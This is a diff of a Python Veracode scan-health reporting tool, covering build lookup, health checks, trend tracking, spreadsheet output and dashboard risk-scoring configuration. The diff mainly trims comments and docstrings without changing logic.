-        # Thresholds are decimal (500_000_000), so report decimal MB. Dividing
-        # by 2^20 printed the 500 MB threshold as "476 MB".
+        # Thresholds are decimal, so report decimal MB.
         issues.append(_chk("medium", f"Analysis size ({asz/1_000_000:.0f} MB) exceeds {MAX_ANALYSIS_SIZE//1_000_000} MB threshold."))
         recs.append("Review packaging to exclude unnecessary files and third-party libraries.")
     total_mod_size = sum(_parse_module_size(m.get("size","")) for m in modules)
@@ -1649,20 +1428,7 @@ CHECK_REGISTRY: list[tuple[int, str, CheckFunc]] = [
 ]
 
 class CheckObserver:
-    """Optional hook into run_checks, used by the single-application report.
-
-    before() runs immediately before each check, on exactly the file and module
-    state that check is about to see. That matters because checks 1, 2, 18 and
-    19 mutate the is_ignored / is_third_party flags in place and later checks
-    read them, so evidence recomputed after run_checks returns would describe a
-    different state from the one the check judged.
-
-    after() receives the check's issues, or the exception it raised. run_checks
-    still logs and swallows the exception exactly as before; the observer is the
-    only way to tell "passed" from "crashed".
-
-    The bulk path passes no observer and pays nothing for this.
-    """
+    """Optional hook into run_checks, used by the single-application report."""
 
     def before(self, num: int, name: str, files: list[dict], modules: list[dict]) -> None:
         """Called before check `num` runs."""
@@ -1698,52 +1464,36 @@ def run_checks(files: list[dict], modules: list[dict], flaws: FlawSummary,
             log.warning("Check #%d (%s) failed: %s", num, name, e)
             if observer is not None:
                 observer.after(num, name, [], [], e)
+        # Outside the try: an observer bug must not look like a failing check.
         else:
-            # Outside the try so an observer bug is never mistaken for a
-            # failing check.
             if observer is not None:
                 observer.after(num, name, iss, rcs, None)
     return all_issues, all_recs, check_recs
 
 
-# ==========================================================================
-# Orchestration
-# ==========================================================================
-
-MAX_BUILD_WALK = 5   # cap on how far back to walk when the newest is unpublished
+MAX_BUILD_WALK = 5
 
 
 def _find_latest_published_build(client: VeracodeClient, aid: int,
                                  sbx: str | None = None) -> dict | None:
-    """Locate the newest build with published results.
-
-    Fast path (one request): getbuildinfo.do without a build_id returns the most
-    recent scan. If it is published, we are done and never call getbuildlist.
-
-    Slow path: only when the newest scan is unpublished (mid-scan, prescan
-    failed, deleted results). Then we fetch the build list and walk back, but no
-    further than MAX_BUILD_WALK, so a profile with 400 historic builds and no
-    published results costs a bounded number of requests instead of 400.
-    """
+    """Locate the newest build with published results."""
     latest = client.get_build_info(aid, sbx=sbx)
     if latest and latest.get("published") and latest.get("build_id"):
         return {"id": latest["build_id"], "ver": latest.get("version", "")}
 
     builds = client.get_builds(aid, sbx)
     if not builds:
-        # No list either: fall back to whatever the single lookup returned.
         if latest and latest.get("build_id"):
             return {"id": latest["build_id"], "ver": latest.get("version", "")}
         return None
 
-    # getbuildlist.do does not document its order. Sort by numeric build_id
-    # (Veracode's own Go tool does the same) so "newest" is never a guess.
+    # getbuildlist order is undocumented: sort by numeric build_id, as Veracode's tool does.
     builds = sorted(builds, key=lambda b: int(b["id"]) if str(b.get("id") or "").isdigit() else -1)
     newest_id = (latest or {}).get("build_id")
     walked = 0
     for b in reversed(builds):
         if b["id"] == newest_id:
-            continue          # already known to be unpublished
+            continue
         walked += 1
         if walked > MAX_BUILD_WALK:
             log.debug("app %s: stopped walking builds after %d unpublished",
@@ -1752,7 +1502,7 @@ def _find_latest_published_build(client: VeracodeClient, aid: int,
         bi = client.get_build_info(aid, b["id"], sbx)
         if bi and bi.get("published"):
             return b
-    # Nothing published: return the newest build so prescan diagnostics still run.
+    # Nothing published: newest build, so prescan diagnostics still run.
     return builds[-1]
 
 
@@ -1761,9 +1511,8 @@ _SEV_RANK = {"low": 0, "medium": 1, "high": 2}
 
 def _recommendation_severities(issues: list[Issue],
                                check_recs: dict[int, list[str]]) -> dict[str, str]:
-    """Map each recommendation string to the worst severity among the issues
-    of the checks that produced it. A string shared by several checks (for
-    example the auto-packaging link) takes the worst of them."""
+    """Map each recommendation string to the worst severity among the issues of the checks that
+    produced it."""
     out: dict[str, str] = {}
     for i in issues:
         for r in check_recs.get(i.check_num, []):
@@ -1773,8 +1522,7 @@ def _recommendation_severities(issues: list[Issue],
 
 
 def platform_urls(base: str, dr: dict, bid: str) -> tuple[str, str]:
-    """Review Modules and Triage Flaws deep links for a build. Both are empty
-    when the detailed report did not supply an account id."""
+    """Review Modules and Triage Flaws deep links for a build."""
     acct = dr.get("account_id",""); aid_str = dr.get("app_id","")
     an_id = dr.get("analysis_id",""); sau = dr.get("sau_id",""); sbx_id = dr.get("sandbox_id",0)
     rev_url = f"{base}/auth/index.jsp#AnalyzeAppModuleList:{acct}:{aid_str}:{bid}:{an_id}:{sau}::::{sbx_id}" if acct else ""
@@ -1793,11 +1541,8 @@ def _process_build(client: VeracodeClient, app: dict, build: dict,
         return sr, [], [], [], [], None
 
     bid = build["id"]
-    # A published build always has a file list and prescan results, so once
-    # its detailed report exists, a failure on either is a retrieval failure
-    # and is raised (the caller records the profile as "Error", not as a
-    # clean scan with no files). For a build without results, prescan data
-    # may legitimately be missing and is fetched leniently, as before.
+    # A published build always has files and prescan results: a failure here is Error, not a clean
+    # scan.
     dr = client.get_detailed_report(bid, strict=True)
     files = client.get_files(legacy_id, bid, strict=dr is not None)
     prescan = client.get_prescan(legacy_id, bid, strict=dr is not None)
@@ -1818,9 +1563,7 @@ def _process_build(client: VeracodeClient, app: dict, build: dict,
     rev_url, tri_url = platform_urls(client.base, dr, bid)
 
     scan_meta = {"review_url": rev_url, "triage_url": tri_url, "analysis_size": dr.get("analysis_size",0)}
-    # Check #30 gets the scan's own published date. Sandboxes are excluded:
-    # sandbox scans are developer iterations and are not the signal for whether
-    # an application is under regular policy scanning.
+    # Check 30 uses the scan's published date; sandbox scans are not policy cadence.
     recency_date = dr.get("published", "") if not sandbox_name else ""
     issues, recs, check_recs = run_checks(files, modules, fl, scan_meta,
                               dr.get("sca_on",False), dr.get("sca_comps",[]),
@@ -1838,11 +1581,9 @@ def _process_build(client: VeracodeClient, app: dict, build: dict,
     total_upload = sum(_parse_module_size(m.get("size","")) for m in modules)
     asz = dr.get("analysis_size",0)
 
-    # Trend
     trend: TrendRow | None = None
     trend_label = ""
-    # Match the previous report on app id first, so a renamed profile keeps
-    # its trend; name is the fallback for reports without an App ID column.
+    # Match the previous report by app id first so renames keep their trend.
     sbx_key = sandbox_name or dr.get("sandbox_name","")
     prev = None
     if prev_data:
@@ -1898,20 +1639,15 @@ def _process_build(client: VeracodeClient, app: dict, build: dict,
                  ignored=f["is_ignored"], third_party=f["is_third_party"])
                  for f in files]
 
-    # Build recommendation rows. Each rec takes the worst severity among the
-    # issues raised by the check(s) that emitted it. (It previously scanned
-    # every issue, so every rec got the application's worst severity.)
     rec_sev = _recommendation_severities(issues, check_recs)
     rec_rows: list[RecommendationRow] = []
     for r in recs:
         rec_rows.append(RecommendationRow(app_name=app["name"], build_id=bid,
                     severity=rec_sev.get(r, "low"), recommendation=r, doc_url=_extract_url(r)))
 
-    # Build structured aggregation issues (one per issue, with check metadata and matched rec)
     sb_name = sandbox_name or dr.get("sandbox_name", "")
     agg_issues: list[AggIssue] = []
     for i in issues:
-        # Get the first recommendation from this specific check
         check_rec_list = check_recs.get(i.check_num, [])
         matched_rec = check_rec_list[0] if check_rec_list else ""
         agg_issues.append(AggIssue(
@@ -1934,9 +1670,7 @@ def _empty_result(app: dict, lid: int, sandbox: str = "") -> ScanResult:
 
 
 def _error_result(app: dict, lid: int, err: str, sandbox: str = "") -> ScanResult:
-    """Retrieval failed. Deliberately distinct from _empty_result: a transient
-    API error must never be reported as 'this application was never scanned',
-    because that is a materially different and misleading conclusion."""
+    """Retrieval failed."""
     return ScanResult(app_name=app["name"], bu=app.get("bu",""), policy=app.get("policy",""),
         app_id=lid, sandbox=sandbox, scan_status="Error", health="Unknown",
         high_issues=0, total_issues=0,
@@ -1982,8 +1716,7 @@ def _process_app(client: VeracodeClient, app: dict, skip_no: bool, inc_sb: bool,
             except AuthError:
                 raise
             except Exception as e:
-                # One failed sandbox must not discard the policy result already
-                # collected for this profile: record that sandbox as Error.
+                # A failed sandbox is recorded as Error without discarding the policy result.
                 log.warning("    [!] %s [%s]: %s: %s", app["name"], sb["name"], type(e).__name__, e)
                 rs.append(_error_result(app, lid, f"{type(e).__name__}: {e}", sb["name"]))
                 continue
@@ -1992,10 +1725,6 @@ def _process_app(client: VeracodeClient, app: dict, skip_no: bool, inc_sb: bool,
 
     return rs, ms, fs, rrs, ais, ts
 
-
-# ==========================================================================
-# Progress
-# ==========================================================================
 
 class Progress:
     """Throughput and ETA reporting for runs measured in hours."""
@@ -2041,10 +1770,6 @@ def _hms(seconds: float) -> str:
     return f"{m}m{sec:02d}s" if m else f"{sec}s"
 
 
-# ==========================================================================
-# Trend
-# ==========================================================================
-
 def _load_previous(path: str) -> dict[tuple[str, str], dict]:
     data: dict[tuple[str, str], dict] = {}
     try:
@@ -2053,9 +1778,6 @@ def _load_previous(path: str) -> dict[tuple[str, str], dict]:
         headers = [c.value for c in next(ws.iter_rows(min_row=1, max_row=1))]
         for row in ws.iter_rows(min_row=2, values_only=True):
             rd = dict(zip(headers, row))
-            # Keyed by app id when the report has one (renames keep their
-            # trend), else by name. One key per row so consumers that iterate
-            # .values() never see a row twice.
             aid = str(rd.get("App ID") or "").strip()
             name_or_id = f"id:{aid}" if aid and aid != "0" else str(rd.get("App Name",""))
             key = (name_or_id, str(rd.get("Sandbox","") or ""))
@@ -2067,9 +1789,8 @@ def _load_previous(path: str) -> dict[tuple[str, str], dict]:
 
 
 def _load_previous_agg(path: str) -> dict[int, int]:
-    """Read 'Check # -> Apps Affected' from a prior report's Tenant Aggregation
-    sheet so the dashboard can trend each health check over time. Optional: an
-    older report without that sheet simply yields no baseline."""
+    """Read 'Check # -> Apps Affected' from a prior report's Tenant Aggregation sheet so the dashboard
+    can trend each health check over time."""
     counts: dict[int, int] = {}
     try:
         wb = load_workbook(path, read_only=True)
@@ -2088,10 +1809,6 @@ def _load_previous_agg(path: str) -> dict[int, int]:
         log.debug("Could not load previous aggregation: %s", e)
     return counts
 
-
-# ==========================================================================
-# Output
-# ==========================================================================
 
 _CW: dict[str, int] = {"App Name":30,"Issues":80,"Recommendations":80,"Module":30,
     "File":35,"Review Modules URL":50,"Triage Flaws URL":50,"Policy":25,
@@ -2121,16 +1838,10 @@ def _sheet(ws: Any, rows: list[dict], hcol: str | None = None, age_col: str | No
 
 
 def _build_aggregation(agg_issues: list[AggIssue], total_apps: int) -> list[dict]:
-    """Build accurate tenant-level aggregation from structured AggIssue records.
-
-    Groups issues by (check_num, check_name) so each row represents one type of
-    problem across the tenant. Uses the real check metadata rather than regex
-    guesswork on serialized strings.
-    """
+    """Build accurate tenant-level aggregation from structured AggIssue records."""
     if not agg_issues:
         return []
 
-    # Group by check number
     by_check: dict[int, list[AggIssue]] = {}
     for ai in agg_issues:
         by_check.setdefault(ai.check_num, []).append(ai)
@@ -2141,7 +1852,6 @@ def _build_aggregation(agg_issues: list[AggIssue], total_apps: int) -> list[dict
         check_name = group[0].check_name
         category = group[0].category
 
-        # Highest severity in this group
         sevs = {ai.severity for ai in group}
         if "high" in sevs:
             sev = "HIGH"
@@ -2150,7 +1860,6 @@ def _build_aggregation(agg_issues: list[AggIssue], total_apps: int) -> list[dict
         else:
             sev = "LOW"
 
-        # Unique apps
         unique_apps = list(dict.fromkeys(ai.app_name for ai in group))
         app_count = len(unique_apps)
         pct = round(100 * app_count / total_apps, 1) if total_apps else 0
@@ -2159,7 +1868,6 @@ def _build_aggregation(agg_issues: list[AggIssue], total_apps: int) -> list[dict
         if len(unique_apps) > 10:
             app_str += f" and {len(unique_apps) - 10} others"
 
-        # Unique business units with counts
         bu_counter: Counter[str] = Counter()
         for ai in group:
             if ai.bu: bu_counter[ai.bu] += 1
@@ -2168,11 +1876,8 @@ def _build_aggregation(agg_issues: list[AggIssue], total_apps: int) -> list[dict
         if len(bu_counter) > 10:
             bu_str += f" and {len(bu_counter) - 10} others"
 
-        # Total issue occurrences (may exceed app count when one app triggers
-        # multiple sub-issues from the same check, e.g. multiple fatal error types)
         occurrence_count = len(group)
 
-        # Representative issue: pick the most common normalized pattern
         pattern_counter: Counter[str] = Counter()
         for ai in group:
             clean = re.sub(r'"[^"]*"', '(name)', ai.description)
@@ -2180,7 +1885,6 @@ def _build_aggregation(agg_issues: list[AggIssue], total_apps: int) -> list[dict
             pattern_counter[clean] += 1
         sample = pattern_counter.most_common(1)[0][0] if pattern_counter else ""
 
-        # Top recommendation: pick the first non-empty one
         rec = ""
         for ai in group:
             if ai.recommendation:
@@ -2201,21 +1905,19 @@ def _build_aggregation(agg_issues: list[AggIssue], total_apps: int) -> list[dict
             "Top Recommendation": rec,
         })
 
-    # Sort by severity (HIGH first), then by app count descending
     sev_order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2}
     rows.sort(key=lambda r: (sev_order.get(r["Severity"], 3), -r["Apps Affected"]))
 
     return rows
 
 
-XLSX_MAX_ROWS = 1_048_576   # Excel/openpyxl hard limit
+XLSX_MAX_ROWS = 1_048_576
 
 
 def _fit_sheet(rows: list[dict], name: str) -> list[dict]:
-    """Truncate a sheet that cannot physically fit, rather than letting
-    openpyxl raise after the entire (multi-hour) collection run has finished.
-    Only the per-file and per-module sheets can realistically reach this."""
-    limit = XLSX_MAX_ROWS - 1          # one row reserved for the header
+    """Truncate a sheet that cannot physically fit, rather than letting openpyxl raise after the entire
+    (multi-hour) collection run has finished."""
+    limit = XLSX_MAX_ROWS - 1
     if len(rows) <= limit:
         return rows
     log.error("[!] '%s' has %d rows, exceeding the Excel limit of %d. Writing the "
@@ -2240,7 +1942,6 @@ def write_excel(health: list[dict], mods: list[dict], files: list[dict],
     if recs: _sheet(wb.create_sheet("Recommendations"), recs)
     if trends: _sheet(wb.create_sheet("Trends"), trends)
     if agg: _sheet(wb.create_sheet("Tenant Aggregation"), agg)
-    # Overview
     wso=wb.create_sheet("Tenant Overview")
     tot=len(health); good=sum(1 for r in health if r.get("Health")=="Good")
     poor=sum(1 for r in health if r.get("Health")=="Poor")
@@ -2259,7 +1960,6 @@ def write_excel(health: list[dict], mods: list[dict], files: list[dict],
     for ri,(k,v) in enumerate(stats,2):
         wso.cell(row=ri,column=1,value=k).font=_BF; wso.cell(row=ri,column=2,value=v).font=_DF
         for c in (1,2): wso.cell(row=ri,column=c).border=_BD; wso.cell(row=ri,column=c).alignment=_CA
-    # Executive Dashboard / heatmaps are prepended; the seven sheets above are untouched.
     if dash_bundle:
         try:
             write_dashboard_sheets(wb, dash_bundle["apps"], dash_bundle["issues"],
@@ -2278,8 +1978,7 @@ def write_csv(health: list[dict], mods: list[dict], files: list[dict],
                        ("recommendations",recs),("trends",trends),("aggregation",agg)]:
         if not rows: continue
         p = parent / f"{stem}_{name}.csv"
-        # Union of keys, not just the first row's, so a heterogeneous batch
-        # (e.g. rows carried forward from an older report) cannot raise.
+        # Union of keys, so rows carried from an older report cannot raise.
         fields: list[str] = []
         for rd in rows:
             for k in rd:
@@ -2308,87 +2007,48 @@ def write_json(health: list[dict], mods: list[dict], files: list[dict],
     log.info("[+] JSON: %s", path)
 
 
-# ==========================================================================
-# Executive Dashboard layer
-#
-# Pure presentation/scoring. Makes NO Veracode API calls: it consumes the
-# rows already built by the scanner above.
-#   Normalization -> Scoring -> Aggregation -> Visualization -> Export
-# ==========================================================================
-
-# ==========================================================================
-# Configuration
-# ==========================================================================
-
 DASHBOARD_CONFIG: dict[str, Any] = {
-    # Scan recency buckets, in days since the published scan.
     "scan_age": {
         "healthy_days": 30,
         "warning_days": 60,
         "critical_days": 90,
     },
 
-    # Count of failing scan-health checks on an application.
     "health_issues": {
-        "green_max": 0,     # <= this is GREEN
-        "yellow_max": 2,    # <= this is YELLOW, above is RED
+        "green_max": 0,
+        "yellow_max": 2,
     },
 
-    # Count of HIGH-severity failing checks on an application.
     "high_severity_issues": {
         "green_max": 0,
         "yellow_max": 1,
     },
 
-    # Security-findings thresholds. Applied to OPEN flaws (not fixed, not
-    # mitigated). "very_high" is Veracode severity 5, "high" is severity 4.
     "flaws": {
-        # Which signal drives the findings axis:
-        #   "auto"           - use Veracode's own score when the scan reports
-        #                      one, otherwise fall back to density (default)
-        #   "density"        - always use the local severity-weighted density
-        #   "veracode_score" - always use Veracode's score; GRAY when absent
         "findings_model": "auto",
 
-        # --- Absolute severity floor. Never normalized by app size, because a
-        # single critical is a single critical whether the app ships 5 modules
-        # or 500. Size must not be able to dilute severity. Applies under every
-        # findings model, so a clean score can never mask an open critical.
-        "very_high_orange": 1,   # >= this many open Very High -> at least ORANGE
-        "very_high_red": 3,      # >= this many open Very High -> RED
-        "high_orange": 1,        # >= this many open High      -> at least ORANGE
-        "high_red": 5,           # >= this many open High      -> RED
+        # Absolute severity floor, never normalised by size: one critical is one critical.
+        "very_high_orange": 1,
+        "very_high_red": 3,
+        "high_orange": 1,
+        "high_red": 5,
 
-        # --- Veracode score thresholds (0-100, higher is better).
-        "score_green": 80,       # >= this -> GREEN
-        "score_yellow": 60,      # >= this -> YELLOW, below -> RED
+        "score_green": 80,
+        "score_yellow": 60,
 
-        # --- Size-normalized volume, used when no Veracode score is available.
-        # Flaws are severity-weighted first so 100 lows never equal 20 highs.
         "severity_weights": {"very_high": 10.0, "high": 5.0, "medium": 1.0, "low": 0.1},
 
-        # Denominator: "analysis_mb" | "selected_modules" | "none".
-        # analysis_mb is the default. It comes from the detailedreport's
-        # analysis_size_bytes, so it already covers only what Veracode actually
-        # analyzed, and it scales continuously with code volume.
-        # selected_modules is also correctly scoped (analyzed entry points) but
-        # far coarser: a single fat JAR divides by 1.
-        # Raw total module count is deliberately NOT offered. It counts
-        # dependencies, and it would let an app failing check #29 (excessive
-        # modules) dilute its own flaw density and look safer on this axis
-        # while failing a scan-health check for the same reason.
+        # Not raw module count: it counts dependencies and would let check 29 failures dilute
+        # density.
         "density_basis": "analysis_mb",
-        "min_basis": 1.0,        # floor on the denominator; stops tiny apps exploding
+        "min_basis": 1.0,
 
-        # Weighted flaws per unit of basis. Calibrate against your own tenant:
-        # aggregate_tenant() reports the median and p90 density of each run.
         "density_yellow": 2.0,
         "density_red": 8.0,
     },
 
-    # Attention Score weights. Any component whose input is unavailable is
-    # dropped from BOTH numerator and denominator, so the score stays 0-100
-    # and missing data never silently reads as "healthy".
+    # Unavailable components leave numerator and denominator, so missing data never reads as
+    # healthy.
     "attention_score": {
         "scan_health_weight": 30,
         "scan_age_weight": 20,
@@ -2396,15 +2056,11 @@ DASHBOARD_CONFIG: dict[str, Any] = {
         "high_severity_issue_weight": 15,
         "trend_weight": 10,
         "data_quality_weight": 10,
-        # Ceiling applied to profiles with no published scan results. Without
-        # it, every never-scanned profile scores 100 and crowds genuinely
-        # measured high-risk applications out of the Top 10. An unmeasured
-        # application is a real gap, but it is not evidence of immediate risk.
-        # Set to 100 to disable the cap.
+        # Caps never-scanned profiles so they do not crowd measured high-risk apps out of the Top
+        # 10.
         "never_scanned_cap": 70,
     },
 
-    # Attention Score bands: (min, max, label, risk_level)
     "attention_bands": [
         (0, 19, "Normal", "GREEN"),
         (20, 39, "Monitor", "GREEN"),
@@ -2413,7 +2069,6 @@ DASHBOARD_CONFIG: dict[str, Any] = {
         (80, 100, "Immediate Attention", "RED"),
     ],
 
-    # Organisational issue prevalence, as a share of the tenant.
     "issue_prevalence": {
         "widespread_pct": 20.0,
         "common_pct": 5.0,
@@ -2429,7 +2084,6 @@ DASHBOARD_CONFIG: dict[str, Any] = {
         "RED": "C62828",
         "GRAY": "9E9E9E",
     },
-    # Softer fills for large table bodies; text stays readable.
     "fills": {
         "GREEN": "D6EAD7",
         "YELLOW": "FDF0CC",
@@ -2446,9 +2100,6 @@ DISCLAIMER = (
 
 RISK_ORDER = {"RED": 0, "ORANGE": 1, "YELLOW": 2, "GREEN": 3, "GRAY": 4}
 
-# Human-readable labels for the 31 checks, and the highest severity each check
-# is capable of emitting. Used so the organisational heatmap can list every
-# check, including the ones that nothing triggered.
 CHECK_CATALOG: dict[int, tuple[str, str]] = {
     1:  ("Unnecessary / junk files uploaded", "medium"),
     2:  ("Third-party component selected as entry point", "medium"),
@@ -2486,10 +2137,6 @@ CHECK_CATALOG: dict[int, tuple[str, str]] = {
 DEFAULT_CHECK_CATEGORIES: dict[int, str] = CHECK_CATEGORIES
 
 
-# ==========================================================================
-# Small helpers
-# ==========================================================================
-
 def _i(v: Any, d: int = 0) -> int:
     try:
         if v is None or v == "":
@@ -2525,17 +2172,12 @@ def _clamp(v: float, lo: float = 0.0, hi: float = 1.0) -> float:
 
 
 def _worst(*levels: str) -> str:
-    """Worst (most severe) risk level of those supplied, ignoring GRAY unless
-    it is the only input."""
+    """Worst (most severe) risk level of those supplied, ignoring GRAY unless it is the only input."""
     known = [l for l in levels if l and l != "GRAY"]
     if not known:
         return "GRAY"
     return min(known, key=lambda l: RISK_ORDER.get(l, 99))
 
-
-# ==========================================================================
-# Intermediate model
-# ==========================================================================
 
 @dataclass
 class HealthIssue:
@@ -2548,7 +2190,7 @@ class HealthIssue:
     check_name: str = ""
     check_label: str = ""
     category: str = ""
-    severity: str = ""          # high | medium | low
+    severity: str = ""
     status: str = "FAILED"
     description: str = ""
     recommendation: str = ""
@@ -2565,15 +2207,15 @@ class ApplicationHealth:
     build_id: str = ""
 
     scan_status: str = ""
-    health_status: str = "Unknown"      # Good | Fair | Poor | Unknown
+    health_status: str = "Unknown"
     ever_scanned: bool = False
 
     last_scan_date: str = ""
     scan_age_days: int | None = None
     scan_age_bucket: str = "Never scanned"
 
-    # Security findings. None means "not available", which is NOT zero.
-    critical_flaws: int | None = None    # Veracode Very High (severity 5)
+    # None means not available, which is not zero.
+    critical_flaws: int | None = None
     high_flaws: int | None = None
     medium_flaws: int | None = None
     low_flaws: int | None = None
@@ -2581,18 +2223,18 @@ class ApplicationHealth:
     open_policy_flaws: int = 0
     flaw_severity_available: bool = False
 
-    veracode_score: int | None = None      # Veracode's own 0-100 scan score
+    veracode_score: int | None = None
     veracode_rating: str = ""
     policy_status: str = ""
-    findings_basis: str = ""               # which signal drove the findings axis
+    findings_basis: str = ""
 
     weighted_flaw_load: float = 0.0
-    flaw_density: float | None = None      # None when the basis is unavailable
+    flaw_density: float | None = None
     density_basis_value: float = 0.0
     density_basis_label: str = ""
 
     sca_component_count: int = 0
-    sca_status: str = "Unknown"          # Present | Missing | Unknown
+    sca_status: str = "Unknown"
     analysis_size_mb: float = 0.0
     total_upload_mb: float = 0.0
     files_uploaded: int = 0
@@ -2608,14 +2250,13 @@ class ApplicationHealth:
     top_issue: str = ""
 
     previous_health: str = ""
-    health_trend: str = "Unknown"        # Improving | Stable | Declining | New | Unknown
+    health_trend: str = "Unknown"
 
     attention_score: int = 0
     attention_band: str = ""
     attention_level: str = "GRAY"
     attention_drivers: list[str] = field(default_factory=list)
 
-    # Two independent dimensions, deliberately never merged.
     scan_health_risk: str = "GRAY"
     security_findings_risk: str = "GRAY"
     quadrant: str = ""
@@ -2631,10 +2272,6 @@ class ApplicationHealth:
     def display_name(self) -> str:
         return f"{self.app_name} [{self.sandbox}]" if self.sandbox else self.app_name
 
-
-# ==========================================================================
-# Normalization
-# ==========================================================================
 
 def _dash_age_bucket(days: int | None, cfg: dict) -> str:
     if days is None:
@@ -2675,11 +2312,7 @@ def _issue_count_risk(n: int, bounds: dict) -> str:
 
 
 def flaw_weighted_load(app: ApplicationHealth, cfg: dict) -> float:
-    """Severity-weighted count of open flaws.
-
-    Weighting happens before any normalization so that a large pile of low
-    findings can never add up to a handful of high ones.
-    """
+    """Severity-weighted count of open flaws."""
     w = cfg["flaws"]["severity_weights"]
     return (w["very_high"] * (app.critical_flaws or 0)
             + w["high"] * (app.high_flaws or 0)
@@ -2702,11 +2335,7 @@ def _join_basis(existing: str, addition: str) -> str:
 
 
 def _severity_floor(app: ApplicationHealth, cfg: dict) -> str:
-    """Risk implied by severity alone, before any size normalization.
-
-    This is a floor, not a ratio. Application size can never pull it down, and
-    no favourable score can mask it.
-    """
+    """Risk implied by severity alone, before any size normalization."""
     t = cfg["flaws"]
     vh, hi = app.critical_flaws or 0, app.high_flaws or 0
     if vh >= t["very_high_red"] or hi >= t["high_red"]:
@@ -2717,16 +2346,7 @@ def _severity_floor(app: ApplicationHealth, cfg: dict) -> str:
 
 
 def _flaw_risk(app: ApplicationHealth, cfg: dict) -> str:
-    """Security-findings risk.
-
-    Severity floor first, then a volume signal that accounts for application
-    size. The volume signal is Veracode's own scan score where the scan reports
-    one, since that is already severity-weighted and size-adjusted, and a local
-    severity-weighted density otherwise.
-
-    GRAY when severity data is unavailable, because a flaw total without
-    severities cannot be classified honestly.
-    """
+    """Security-findings risk."""
     if not app.ever_scanned or not app.flaw_severity_available:
         return "GRAY"
     t = cfg["flaws"]
@@ -2756,13 +2376,11 @@ def _flaw_risk(app: ApplicationHealth, cfg: dict) -> str:
         return floor
 
     if model == "veracode_score":
-        # Explicitly requested but unavailable. Do not silently substitute.
         app.findings_basis = _join_basis(app.findings_basis, "Veracode score unavailable")
         return floor if floor != "GREEN" else "GRAY"
 
     if app.flaw_density is None:
-        # Cannot normalize. Report unknown rather than assuming a large flaw
-        # count is fine, but never discard a severity signal already in hand.
+        # Cannot normalise: unknown, not fine; a severity signal already in hand is kept.
         app.findings_basis = _join_basis(app.findings_basis, "Size unknown; volume not normalized")
         if floor != "GREEN":
             return floor
@@ -2786,9 +2404,7 @@ def _trend_risk(trend: str) -> str:
 
 
 def _quadrant(app: ApplicationHealth) -> str:
-    """Priority matrix placement. X axis is scan-health risk, Y axis is
-    security-findings risk. Built only from indicators the scanner actually
-    produces; no business criticality is invented."""
+    """Priority matrix placement."""
     sh_bad = app.scan_health_risk in ("RED", "ORANGE")
     sf_bad = app.security_findings_risk in ("RED", "ORANGE")
     if app.scan_health_risk == "GRAY" and app.security_findings_risk == "GRAY":
@@ -2809,17 +2425,12 @@ def build_application_health(
     cfg: dict | None = None,
     check_categories: dict[int, str] | None = None,
 ) -> tuple[list[ApplicationHealth], list[HealthIssue]]:
-    """Normalize scanner output into the dashboard model.
-
-    Matching against the previous report is done on App ID first so that
-    renamed applications are still tracked, falling back to name.
-    """
+    """Normalize scanner output into the dashboard model."""
     cfg = cfg or DASHBOARD_CONFIG
     cats = check_categories or DEFAULT_CHECK_CATEGORIES
     issue_records = issue_records or []
     prev_rows = prev_rows or {}
 
-    # ---- index the previous report by (app_id, sandbox) and (name, sandbox)
     prev_by_id: dict[tuple[str, str], dict] = {}
     prev_by_name: dict[tuple[str, str], dict] = {}
     for row in prev_rows.values():
@@ -2829,8 +2440,7 @@ def build_application_health(
             prev_by_id[(aid, sbx)] = row
         prev_by_name[(str(row.get("App Name") or ""), sbx)] = row
 
-    # ---- index structured issues by (app_name, sandbox); AggIssue carries no
-    #      app_id, so this is the only join key available.
+    # AggIssue has no app_id, so name is the only join key.
     issues_by_app: dict[tuple[str, str], list[dict]] = {}
     for rec in issue_records:
         k = (str(rec.get("app_name", "")), str(rec.get("sandbox", "") or ""))
@@ -2854,16 +2464,14 @@ def build_application_health(
         ever_scanned = bool(published) and scan_status not in ("No Scan", "No Results")
 
         raw_health = str(row.get("Health", "") or "")
-        # The scanner assigns Poor to never-scanned profiles. For the dashboard
-        # that is unknown, not measured-and-bad.
+        # The scanner marks never-scanned as Poor; for the dashboard that is unknown.
         health = raw_health if ever_scanned else "Unknown"
 
         sev_flag = str(row.get("Flaw Severity Data", "") or "")
         sev_available = ever_scanned and sev_flag == "Available"
 
         sca_count = _i(row.get("SCA Components"))
-        # SCA presence is authoritative from check #9, not from the count of
-        # vulnerable components (zero vulnerable components is a good outcome).
+        # SCA presence comes from check 9; zero vulnerable components is a good outcome.
         app_issue_recs = issues_by_app.get((name, sbx), [])
         failed_nums = sorted({_i(r.get("check_num")) for r in app_issue_recs})
         if not ever_scanned:
@@ -2917,7 +2525,6 @@ def build_application_health(
         recs = str(row.get("Recommendations", "") or "")
         app.recommendations = [r.strip() for r in recs.split("; ") if r.strip() and r != "None"]
 
-        # ---- structured issues
         for rec in app_issue_recs:
             num = _i(rec.get("check_num"))
             label = CHECK_CATALOG.get(num, ("Check %d" % num, "medium"))[0]
@@ -2934,7 +2541,6 @@ def build_application_health(
             )
             all_issues.append(hi)
 
-        # Top issue: worst severity, then the check with the highest severity rank.
         highs = [i for i in app_issue_recs if str(i.get("severity")) == "high"]
         pool = highs or app_issue_recs
         if pool:
@@ -2943,7 +2549,6 @@ def build_application_health(
         elif not ever_scanned:
             app.top_issue = "No published scan results"
 
-        # ---- trend, matched on App ID first
         prow = prev_by_id.get((app_id, sbx)) if app_id else None
         if prow is None:
             prow = prev_by_name.get((name, sbx))
@@ -2957,7 +2562,6 @@ def build_application_health(
         else:
             app.health_trend = "Unknown"
 
-        # ---- risk dimensions
         app.scan_health_risk = _worst(
             _health_risk(app.health_status),
             _issue_count_risk(app.high_severity_issue_count, cfg["high_severity_issues"]),
@@ -2974,7 +2578,6 @@ def build_application_health(
 
         apps.append(app)
 
-    # ---- scoring
     for app in apps:
         score, band, level, drivers = compute_attention_score(app, cfg)
         app.attention_score = score
@@ -2990,11 +2593,7 @@ _HEALTH_RANK = {"Good": 0, "Fair": 1, "Poor": 2, "Unknown": 3, "": 3}
 
 
 def _classify_trend(previous: str, current: str) -> str:
-    """Direction of travel between two health classifications.
-
-    Unknown on either side means the direction is genuinely unknown; it is not
-    reported as stable.
-    """
+    """Direction of travel between two health classifications."""
     if not previous or previous == "Unknown" or current == "Unknown":
         return "Unknown"
     pr, cr = _HEALTH_RANK.get(previous, 3), _HEALTH_RANK.get(current, 3)
@@ -3007,24 +2606,13 @@ def _classify_trend(previous: str, current: str) -> str:
     return "Stable"
 
 
-# ==========================================================================
-# Attention Score
-# ==========================================================================
